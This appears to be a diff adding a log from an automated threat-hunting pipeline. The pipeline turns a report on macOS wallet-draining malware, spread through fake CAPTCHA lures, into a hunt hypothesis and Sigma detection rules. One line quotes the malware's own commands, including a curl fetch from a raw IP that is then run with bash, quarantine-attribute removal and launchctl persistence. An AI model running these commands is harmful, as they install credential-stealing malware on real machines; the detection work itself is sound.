@@ -1,0 +1,33 @@
+[bea949 +   0.0s] start      cycle bea949; drafts today 0/5, research runs today 0/5
+[bea949 +   0.0s] intake     otx: "Mac Malware Drains Crypto Wallets Via Fake CAPTCHA Scam" (1877 chars; indicators: FileHash-MD5 1, FileHash-SHA1 1, FileHash-SHA256 4, URL 1, domain 1; CTI techniques: none)
+[bea949 +   0.0s] triage     pass (no commentary category or title shape)
+[bea949 +   0.0s] quota      draft slot 1/5 reserved
+[bea949 +   0.0s] route      narrative -> research with web search -> hypothesis
+[bea949 + 290.8s] source     https://www.huntress.com/blog/mac-crypto-draining-malware (13497 chars, 2 chunk(s)) in 291s: 12 artifact(s) verified, 3 dropped; 10/12 indicator(s) typed; historical: none
+[bea949 + 290.8s] guidance   the source publishes no detection guidance section
+[bea949 + 290.8s] research   starting: topic "Mac Malware Drains Crypto Wallets Via Fake CAPTCHA Scam"; web search on; source text 4848 chars
+[bea949 + 423.3s] research   R-0001 done in 133s; grounding: independent research, 2 web search(es); describes adversary behavior: yes; related hunts: none
+[bea949 + 423.3s] hypothesis asking the model (grounded by R-0001)
+[bea949 + 502.6s] hypothesis done in 79s: "Adversaries use fake CAPTCHA prompts delivered via email to trick macOS users into executing malicious commands in Terminal, which deploy a…"
+[bea949 + 502.7s] techniques matched in the intel's wording: T1059.002 AppleScript, T1059.004 Unix Shell, T1553.001 Gatekeeper Bypass, T1684 Social Engineering, T1555.001 Keychain, T1569.001 Launchctl
+[bea949 + 502.7s] techniques described behaviour observed: T1204.004, T1082, T1555.001, T1555.003, T1553.001, T1059.004, T1566.002, T1070.004, T1070.003, T1033, T1036.005, T1105, T1543.001, T1059.002, T1056.002, T1027, T1571; capability only: none
+[bea949 + 502.7s] techniques model chose T1684, T1059.004, T1553.001, T1569.001, T1059.002; CTI asserted none -> merged T1059.002, T1059.004, T1553.001, T1684, T1555.001, T1569.001, T1204.004, T1082, T1555.003, T1566.002, T1070.004, T1070.003, T1033, T1036.005, T1105, T1543.001, T1056.002, T1027, T1571
+[bea949 + 502.7s] scope      the specimen's evidence shows macOS: macOS (macos, mach-o, gatekeeper, /library/, launchagents, osascript)
+[bea949 + 502.7s] scope      techniques run on macOS, ESXi, Linux, Network Devices, Office Suite, SaaS, Windows, IaaS, Identity Provider, Containers; hypothesis names macOS
+[bea949 + 502.7s] scope      narrowed to what the hypothesis names: macOS
+[bea949 + 502.7s] scope      platforms macOS; tactics execution, defense-impairment, stealth, credential-access, discovery, initial-access, command-and-control, persistence, privilege-escalation, collection; data sources endpoint_data, network_logs, process_execution, file_operations, network_connections
+[bea949 + 502.7s] claims     audit: 1 removed
+[bea949 + 502.8s] grounding  H-0001: 0 asserted by CTI, 0 research-only, 19 inferred, 0 UNSUPPORTED
+[bea949 + 502.8s] write      H-0001 written to /tmp/claude-1000/-home-chemch-betas/b11ca954-7e55-4f2b-bd3c-62454d69db20/scratchpad/replay_test/hunts/2026/Q4/H-0001.md
+[bea949 + 502.8s] sigma      9 command(s) the source shows being run: curl http://193.29.224.151/92392991a0cca55?force=1, bash .UlaccK, xattr -d com.apple.quarantine, launchctl bootstrap, rm -f .UlaccK, ioreg -c IOPlatformExpertDevice, system_profiler SPHardwareDataType, mkdir -p /Library/Caches/com.apple.trustd, chmod +x com.apple.verified
+[bea949 + 502.8s] sigma      pass 1: 3 exact value(s) from the source rules may match: com.apple.verified, /Users/*/Library/Caches/com.apple.softwareupdate/SoftwareUpdate, osascript
+[bea949 + 502.8s] sigma      drafting rules from techniques T1059.002, T1059.004, T1553.001, T1684, T1555.001, T1569.001, T1204.004, T1082, T1555.003, T1566.002, T1070.004, T1070.003, T1033, T1036.005, T1105, T1543.001, T1056.002, T1027, T1571, indicator types md5, sha1, sha256, url, domain, ipv4, platforms macOS
+[bea949 + 804.9s] sigma      rejected dns_query: not valid Sigma (SigmaModifierError: Unknown modifier 'in')
+[bea949 + 804.9s] sigma      rejected file_event: '/Users/*/Library/Caches/com.apple.softwareupdate/SoftwareUpdate/.' is not a value the source gives; in file, process, command-line and registry fi…
+[bea949 + 804.9s] sigma      rejected network_connection: filter 'filter' excludes '/usr/bin/osascript', which matches '/usr/bin/osascript', an artifact the hunt names as the threat's own; the rule…
+[bea949 + 804.9s] sigma      rejected process_creation: '/usr/bin/terminal' is not a value the source gives; in file, process, command-line and registry fields use only the EXACT VALUES FROM THE SO…
+[bea949 + 804.9s] sigma      done in 302s: 14 rule(s) kept (dns_query, file_event, network_connection, process_creation, proxy), 4 rejected
+[bea949 + 805.0s] provenance 15 indicator(s) across 14 rule(s), each traced to its source
+[bea949 + 805.0s] review     0 model rule(s) reviewed; 2 uncovered behaviour(s): The attackers also attained further elevated privilege by prompting the victim for their credentials via an osascript dialogue, Copies the downloaded malware executable to this directory, under the name com.apple.verified
+[bea949 + 805.0s] grounding  H-0001: 9 asserted by CTI, 1 research-only, 19 inferred, 1 UNSUPPORTED (77.221.152.34)
+[bea949 + 805.0s] done       draft_created -> H-0001 in 805s
